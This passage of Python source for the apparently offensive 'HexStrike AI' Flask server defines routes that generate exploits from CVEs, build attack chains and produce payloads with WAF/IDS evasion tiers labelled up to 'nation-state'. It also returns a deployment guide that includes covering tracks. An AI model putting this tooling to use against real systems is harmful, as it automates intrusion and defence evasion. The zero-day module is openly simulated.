        # Generate exploit
        exploit_result = exploit_generator.generate_exploit_from_cve(cve_data, target_info)
        
        # Search for existing exploits for reference
        existing_exploits = cve_intelligence.search_existing_exploits(cve_id)
        
        result = {
            "success": True,
            "cve_analysis": cve_analysis,
            "exploit_generation": exploit_result,
            "existing_exploits": existing_exploits,
            "target_info": target_info,
            "timestamp": datetime.now().isoformat()
        }
        
        logger.info(f"🎯 Exploit generation completed for {cve_id}")
        return jsonify(result)
        
    except Exception as e:
        logger.error(f"💥 Error in exploit generation: {str(e)}")
        return jsonify({
            "success": False,
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/vuln-intel/attack-chains", methods=["POST"])
def discover_attack_chains():
    """Discover multi-stage attack possibilities"""
    try:
        params = request.json
        target_software = params.get("target_software", "")
        attack_depth = params.get("attack_depth", 3)
        include_zero_days = params.get("include_zero_days", False)
        
        if not target_software:
            logger.warning("🔗 Attack chain discovery called without target software")
            return jsonify({
                "success": False,
                "error": "Target software parameter is required"
            }), 400
        
        logger.info(f"🔗 Discovering attack chains for {target_software} | Depth: {attack_depth}")
        
        # Discover attack chains
        chain_results = vulnerability_correlator.find_attack_chains(target_software, attack_depth)
        
        # Enhance with exploit generation for viable chains
        if chain_results.get("success") and chain_results.get("attack_chains"):
            enhanced_chains = []
            
            for chain in chain_results["attack_chains"][:2]:  # Enhance top 2 chains
                enhanced_chain = chain.copy()
                enhanced_stages = []
                
                for stage in chain["stages"]:
                    enhanced_stage = stage.copy()
                    
                    # Try to generate exploit for this stage
                    vuln = stage.get("vulnerability", {})
                    cve_id = vuln.get("cve_id", "")
                    
                    if cve_id:
                        try:
                            cve_data = {"cve_id": cve_id, "description": vuln.get("description", "")}
                            target_info = {"target_os": "linux", "target_arch": "x64", "evasion_level": "basic"}
                            
                            exploit_result = exploit_generator.generate_exploit_from_cve(cve_data, target_info)
                            enhanced_stage["exploit_available"] = exploit_result.get("success", False)
                            
                            if exploit_result.get("success"):
                                enhanced_stage["exploit_code"] = exploit_result.get("exploit_code", "")[:500] + "..."
                        except:
                            enhanced_stage["exploit_available"] = False
                    
                    enhanced_stages.append(enhanced_stage)
                
                enhanced_chain["stages"] = enhanced_stages
                enhanced_chains.append(enhanced_chain)
            
            chain_results["enhanced_chains"] = enhanced_chains
        
        result = {
            "success": True,
            "attack_chain_discovery": chain_results,
            "parameters": {
                "target_software": target_software,
                "attack_depth": attack_depth,
                "include_zero_days": include_zero_days
            },
            "timestamp": datetime.now().isoformat()
        }
        
        logger.info(f"🎯 Attack chain discovery completed | Found: {len(chain_results.get('attack_chains', []))} chains")
        return jsonify(result)
        
    except Exception as e:
        logger.error(f"💥 Error in attack chain discovery: {str(e)}")
        return jsonify({
            "success": False,
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/vuln-intel/threat-feeds", methods=["POST"])
def threat_intelligence_feeds():
    """Aggregate and correlate threat intelligence from multiple sources"""
    try:
        params = request.json
        indicators = params.get("indicators", [])
        timeframe = params.get("timeframe", "30d")
        sources = params.get("sources", "all")
        
        if isinstance(indicators, str):
            indicators = [i.strip() for i in indicators.split(",")]
        
        if not indicators:
            logger.warning("🧠 Threat intelligence called without indicators")
            return jsonify({
                "success": False,
                "error": "Indicators parameter is required"
            }), 400
        
        logger.info(f"🧠 Correlating threat intelligence for {len(indicators)} indicators")
        
        correlation_results = {
            "indicators_analyzed": indicators,
            "timeframe": timeframe,
            "sources": sources,
            "correlations": [],
            "threat_score": 0,
            "recommendations": []
        }
        
        # Analyze each indicator
        cve_indicators = [i for i in indicators if i.startswith("CVE-")]
        ip_indicators = [i for i in indicators if i.replace(".", "").isdigit()]
        hash_indicators = [i for i in indicators if len(i) in [32, 40, 64] and all(c in "0123456789abcdef" for c in i.lower())]
        
        # Process CVE indicators
        for cve_id in cve_indicators:
            try:
                cve_analysis = cve_intelligence.analyze_cve_exploitability(cve_id)
                if cve_analysis.get("success"):
                    correlation_results["correlations"].append({
                        "indicator": cve_id,
                        "type": "cve",
                        "analysis": cve_analysis,
                        "threat_level": cve_analysis.get("exploitability_level", "UNKNOWN")
                    })
                    
                    # Add to threat score
                    exploit_score = cve_analysis.get("exploitability_score", 0)
                    correlation_results["threat_score"] += min(exploit_score, 100)
                    
                # Search for existing exploits
                exploits = cve_intelligence.search_existing_exploits(cve_id)
                if exploits.get("success") and exploits.get("total_exploits", 0) > 0:
                    correlation_results["correlations"].append({
                        "indicator": cve_id,
                        "type": "exploit_availability",
                        "exploits_found": exploits.get("total_exploits", 0),
                        "threat_level": "HIGH"
                    })
                    correlation_results["threat_score"] += 25
                    
            except Exception as e:
                logger.warning(f"Error analyzing CVE {cve_id}: {str(e)}")
        
        # Process IP indicators (basic reputation check simulation)
        for ip in ip_indicators:
            # Simulate threat intelligence lookup
            correlation_results["correlations"].append({
                "indicator": ip,
                "type": "ip_reputation",
                "analysis": {
                    "reputation": "unknown",
                    "geolocation": "unknown",
                    "associated_threats": []
                },
                "threat_level": "MEDIUM"  # Default for unknown IPs
            })
        
        # Process hash indicators
        for hash_val in hash_indicators:
            correlation_results["correlations"].append({
                "indicator": hash_val,
                "type": "file_hash",
                "analysis": {
                    "hash_type": f"hash{len(hash_val)}",
                    "malware_family": "unknown",
                    "detection_rate": "unknown"
                },
                "threat_level": "MEDIUM"
            })
        
        # Calculate overall threat score and generate recommendations
        total_indicators = len(indicators)
        if total_indicators > 0:
            correlation_results["threat_score"] = min(correlation_results["threat_score"] / total_indicators, 100)
            
            if correlation_results["threat_score"] >= 75:
                correlation_results["recommendations"] = [
                    "Immediate threat response required",
                    "Block identified indicators",
                    "Enhance monitoring for related IOCs",
                    "Implement emergency patches for identified CVEs"
                ]
            elif correlation_results["threat_score"] >= 50:
                correlation_results["recommendations"] = [
                    "Elevated threat level detected",
                    "Increase monitoring for identified indicators",
                    "Plan patching for identified vulnerabilities",
                    "Review security controls"
                ]
            else:
                correlation_results["recommendations"] = [
                    "Low to medium threat level",
                    "Continue standard monitoring",
                    "Plan routine patching",
                    "Consider additional threat intelligence sources"
                ]
        
        result = {
            "success": True,
            "threat_intelligence": correlation_results,
            "timestamp": datetime.now().isoformat()
        }
        
        logger.info(f"🎯 Threat intelligence correlation completed | Threat Score: {correlation_results['threat_score']:.1f}")
        return jsonify(result)
        
    except Exception as e:
        logger.error(f"💥 Error in threat intelligence: {str(e)}")
        return jsonify({
            "success": False,
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/vuln-intel/zero-day-research", methods=["POST"])
def zero_day_research():
    """Automated zero-day vulnerability research using AI analysis"""
    try:
        params = request.json
        target_software = params.get("target_software", "")
        analysis_depth = params.get("analysis_depth", "standard")
        source_code_url = params.get("source_code_url", "")
        
        if not target_software:
            logger.warning("🔬 Zero-day research called without target software")
            return jsonify({
                "success": False,
                "error": "Target software parameter is required"
            }), 400
        
        logger.info(f"🔬 Starting zero-day research for {target_software} | Depth: {analysis_depth}")
        
        research_results = {
            "target_software": target_software,
            "analysis_depth": analysis_depth,
            "research_areas": [],
            "potential_vulnerabilities": [],
            "risk_assessment": {},
            "recommendations": []
        }
        
        # Define research areas based on software type
        common_research_areas = [
            "Input validation vulnerabilities",
            "Memory corruption issues",
            "Authentication bypasses",
            "Authorization flaws",
            "Cryptographic weaknesses",
            "Race conditions",
            "Logic flaws"
        ]
        
        # Software-specific research areas
        web_research_areas = [
            "Cross-site scripting (XSS)",
            "SQL injection",
            "Server-side request forgery (SSRF)",
            "Insecure deserialization",
            "Template injection"
        ]
        
        system_research_areas = [
            "Buffer overflows",
            "Privilege escalation",
            "Kernel vulnerabilities",
            "Service exploitation",
            "Configuration weaknesses"
        ]
        
        # Determine research areas based on target
        target_lower = target_software.lower()
        if any(web_tech in target_lower for web_tech in ["apache", "nginx", "tomcat", "php", "node", "django"]):
            research_results["research_areas"] = common_research_areas + web_research_areas
        elif any(sys_tech in target_lower for sys_tech in ["windows", "linux", "kernel", "driver"]):
            research_results["research_areas"] = common_research_areas + system_research_areas
        else:
            research_results["research_areas"] = common_research_areas
        
        # Simulate vulnerability discovery based on analysis depth
        vuln_count = {"quick": 2, "standard": 4, "comprehensive": 6}.get(analysis_depth, 4)
        
        for i in range(vuln_count):
            potential_vuln = {
                "id": f"RESEARCH-{target_software.upper()}-{i+1:03d}",
                "category": research_results["research_areas"][i % len(research_results["research_areas"])],
                "severity": ["LOW", "MEDIUM", "HIGH", "CRITICAL"][i % 4],
                "confidence": ["LOW", "MEDIUM", "HIGH"][i % 3],
                "description": f"Potential {research_results['research_areas'][i % len(research_results['research_areas'])].lower()} in {target_software}",
                "attack_vector": "To be determined through further analysis",
                "impact": "To be assessed",
                "proof_of_concept": "Research phase - PoC development needed"
            }
            research_results["potential_vulnerabilities"].append(potential_vuln)
        
        # Risk assessment
        high_risk_count = sum(1 for v in research_results["potential_vulnerabilities"] if v["severity"] in ["HIGH", "CRITICAL"])
        total_vulns = len(research_results["potential_vulnerabilities"])
        
        research_results["risk_assessment"] = {
            "total_areas_analyzed": len(research_results["research_areas"]),
            "potential_vulnerabilities_found": total_vulns,
            "high_risk_findings": high_risk_count,
            "risk_score": min((high_risk_count * 25 + (total_vulns - high_risk_count) * 10), 100),
            "research_confidence": analysis_depth
        }
        
        # Generate recommendations
        if high_risk_count > 0:
            research_results["recommendations"] = [
                "Prioritize security testing in identified high-risk areas",
                "Conduct focused penetration testing",
                "Implement additional security controls",
                "Consider bug bounty program for target software",
                "Perform code review in identified areas"
            ]
        else:
            research_results["recommendations"] = [
                "Continue standard security testing",
                "Monitor for new vulnerability research",
                "Implement defense-in-depth strategies",
                "Regular security assessments recommended"
            ]
        
        # Source code analysis simulation
        if source_code_url:
            research_results["source_code_analysis"] = {
                "repository_url": source_code_url,
                "analysis_status": "simulated",
                "findings": [
                    "Static analysis patterns identified",
                    "Potential code quality issues detected",
                    "Security-relevant functions located"
                ],
                "recommendation": "Manual code review recommended for identified areas"
            }
        
        result = {
            "success": True,
            "zero_day_research": research_results,
            "disclaimer": "This is simulated research for demonstration. Real zero-day research requires extensive manual analysis.",
            "timestamp": datetime.now().isoformat()
        }
        
        logger.info(f"🎯 Zero-day research completed | Risk Score: {research_results['risk_assessment']['risk_score']}")
        return jsonify(result)
        
    except Exception as e:
        logger.error(f"💥 Error in zero-day research: {str(e)}")
        return jsonify({
            "success": False,
            "error": f"Server error: {str(e)}"
        }), 500

@app.route("/api/ai/advanced-payload-generation", methods=["POST"])
def advanced_payload_generation():
    """Generate advanced payloads with AI-powered evasion techniques"""
    try:
        params = request.json
        attack_type = params.get("attack_type", "rce")
        target_context = params.get("target_context", "")
        evasion_level = params.get("evasion_level", "standard")
        custom_constraints = params.get("custom_constraints", "")
        
        if not attack_type:
            logger.warning("🎯 Advanced payload generation called without attack type")
            return jsonify({
                "success": False,
                "error": "Attack type parameter is required"
            }), 400
        
        logger.info(f"🎯 Generating advanced {attack_type} payload with {evasion_level} evasion")
        
        # Enhanced payload generation with contextual AI
        target_info = {
            "attack_type": attack_type,
            "complexity": "advanced",
            "technology": target_context,
            "evasion_level": evasion_level,
            "constraints": custom_constraints
        }
        
        # Generate base payloads using existing AI system
        base_result = ai_payload_generator.generate_contextual_payload(target_info)
        
        # Enhance with advanced techniques
        advanced_payloads = []
        
        for payload_info in base_result.get("payloads", [])[:10]:  # Limit to 10 advanced payloads
            enhanced_payload = {
                "payload": payload_info["payload"],
                "original_context": payload_info["context"],
                "risk_level": payload_info["risk_level"],
                "evasion_techniques": [],
                "deployment_methods": []
            }
            
            # Apply evasion techniques based on level
            if evasion_level in ["advanced", "nation-state"]:
                # Advanced encoding techniques
                encoded_variants = [
                    {
                        "technique": "Double URL Encoding",
                        "payload": payload_info["payload"].replace("%", "%25").replace(" ", "%2520")
                    },
                    {
                        "technique": "Unicode Normalization",
                        "payload": payload_info["payload"].replace("script", "scr\u0131pt")
                    },
                    {
                        "technique": "Case Variation",
                        "payload": "".join(c.upper() if i % 2 else c.lower() for i, c in enumerate(payload_info["payload"]))
                    }
                ]
                enhanced_payload["evasion_techniques"].extend(encoded_variants)
            
            if evasion_level == "nation-state":
                # Nation-state level techniques
                advanced_techniques = [
                    {
                        "technique": "Polyglot Payload",
                        "payload": f"/*{payload_info['payload']}*/ OR {payload_info['payload']}"
                    },
                    {
                        "technique": "Time-delayed Execution",
                        "payload": f"setTimeout(function(){{{payload_info['payload']}}}, 1000)"
                    },
                    {
                        "technique": "Environmental Keying",
                        "payload": f"if(navigator.userAgent.includes('specific')){{ {payload_info['payload']} }}"
                    }
                ]
                enhanced_payload["evasion_techniques"].extend(advanced_techniques)
            
            # Deployment methods
            enhanced_payload["deployment_methods"] = [
                "Direct injection",
                "Parameter pollution",
                "Header injection",
                "Cookie manipulation",
                "Fragment-based delivery"
            ]
            
            advanced_payloads.append(enhanced_payload)
        
        # Generate deployment instructions
        deployment_guide = {
            "pre_deployment": [
                "Reconnaissance of target environment",
                "Identification of input validation mechanisms",
                "Analysis of security controls (WAF, IDS, etc.)",
                "Selection of appropriate evasion techniques"
            ],
            "deployment": [
                "Start with least detectable payloads",
                "Monitor for defensive responses",
                "Escalate evasion techniques as needed",
                "Document successful techniques for future use"
            ],
            "post_deployment": [
                "Monitor for payload execution",
                "Clean up traces if necessary",
                "Document findings",
                "Report vulnerabilities responsibly"
            ]
        }
        
        result = {
            "success": True,
            "advanced_payload_generation": {
                "attack_type": attack_type,
                "evasion_level": evasion_level,
                "target_context": target_context,
                "payload_count": len(advanced_payloads),
                "advanced_payloads": advanced_payloads,
                "deployment_guide": deployment_guide,
                "custom_constraints_applied": custom_constraints if custom_constraints else "none"
            },
            "disclaimer": "These payloads are for authorized security testing only. Ensure proper authorization before use.",
            "timestamp": datetime.now().isoformat()
        }
        
        logger.info(f"🎯 Advanced payload generation completed | Generated: {len(advanced_payloads)} payloads")
        return jsonify(result)
        
    except Exception as e:
        logger.error(f"💥 Error in advanced payload generation: {str(e)}")
        return jsonify({
            "success": False,
            "error": f"Server error: {str(e)}"
        }), 500

if __name__ == "__main__":
    print(f"{Colors.RED}{Colors.BOLD}{BANNER}{Colors.RESET}")
    
    parser = argparse.ArgumentParser(description="Run the HexStrike AI API Server")
    parser.add_argument("--debug", action="store_true", help="Enable debug mode")
    parser.add_argument("--port", type=int, default=API_PORT, help=f"Port for the API server (default: {API_PORT})")
    args = parser.parse_args()
    
    if args.debug:
        DEBUG_MODE = True
        logger.setLevel(logging.DEBUG)
    
    if args.port != API_PORT:
        API_PORT = args.port
    
    logger.info(f"🚀 Starting HexStrike AI Tools API Server on port {API_PORT}")
    logger.info(f"🔧 Debug Mode: {DEBUG_MODE}")
    logger.info(f"💾 Cache Size: {CACHE_SIZE} | TTL: {CACHE_TTL}s")
    logger.info(f"⏱️  Command Timeout: {COMMAND_TIMEOUT}s")
    
    app.run(host="0.0.0.0", port=API_PORT, debug=DEBUG_MODE)